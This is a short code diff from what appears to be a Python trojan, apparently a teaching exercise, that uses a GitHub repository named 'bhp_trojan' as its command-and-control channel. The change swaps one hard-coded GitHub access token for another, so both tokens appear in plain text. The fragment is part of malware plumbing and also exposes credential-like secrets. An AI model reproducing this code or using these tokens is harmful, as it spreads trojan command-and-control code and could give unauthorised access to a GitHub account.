@@ -9,7 +9,7 @@ import time
 from datetime import datetime
 
 def connect_to_github():
-    token = "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"
+    token = "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"
     sess = github3.login(token=token)
     return sess.repository("Anderaxarex", "bhp_trojan")
 
